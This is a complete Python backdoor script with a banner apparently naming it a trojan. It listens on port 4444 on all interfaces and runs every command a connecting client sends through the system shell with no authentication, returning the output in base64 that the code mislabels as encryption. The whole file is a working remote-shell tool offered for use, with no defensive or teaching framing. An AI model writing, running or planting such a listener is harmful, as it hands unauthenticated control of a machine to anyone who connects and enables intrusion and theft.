import socket
import subprocess
import os
import platform
import threading
import ssl
import base64

banner = '''
  █████████     ███████    █████   █████ ███████████ ███████████      ███████          █████   █████████   ██████   █████
 ███░░░░░███  ███░░░░░███ ░░███   ░░███ ░█░░░███░░░█░░███░░░░░███   ███░░░░░███       ░░███   ███░░░░░███ ░░██████ ░░███ 
░███    ░░░  ███     ░░███ ░███    ░███ ░   ░███  ░  ░███    ░███  ███     ░░███       ░███  ░███    ░███  ░███░███ ░███ 
░░█████████ ░███      ░███ ░███    ░███     ░███     ░██████████  ░███      ░███       ░███  ░███████████  ░███░░███░███ 
 ░░░░░░░░███░███      ░███ ░░███   ███      ░███     ░███░░░░░███ ░███      ░███       ░███  ░███░░░░░███  ░███ ░░██████ 
 ███    ░███░░███     ███   ░░░█████░       ░███     ░███    ░███ ░░███     ███  ███   ░███  ░███    ░███  ░███  ░░█████ 
░░█████████  ░░░███████░      ░░███         █████    █████   █████ ░░░███████░  ░░████████   █████   █████ █████  ░░█████
 ░░░░░░░░░     ░░░░░░░         ░░░         ░░░░░    ░░░░░   ░░░░░    ░░░░░░░     ░░░░░░░░   ░░░░░   ░░░░░ ░░░░░    ░░░░░ 
'''

print(banner)

def execute_command(command):
    if platform.system() == "Windows":
        command = "cmd.exe /c " + command
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process.stdout.read().decode(), process.stderr.read().decode()

def encrypt_data(data):
    return base64.b64encode(data.encode()).decode()

def decrypt_data(data):
    return base64.b64decode(data).decode()

def handle_client(client_socket):
    while True:
        encrypted_command = client_socket.recv(1024).decode()
        if not encrypted_command:
            break
        command = decrypt_data(encrypted_command)
        output, error = execute_command(command)
        encrypted_output = encrypt_data(output + error)
        client_socket.send(encrypted_output.encode())
    client_socket.close()

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 4444))
    server_socket.listen(5)
    print("Listening for incoming connections...")
    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr} has been established!")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()
    server_socket.close()

if __name__ == "__main__":
    main()
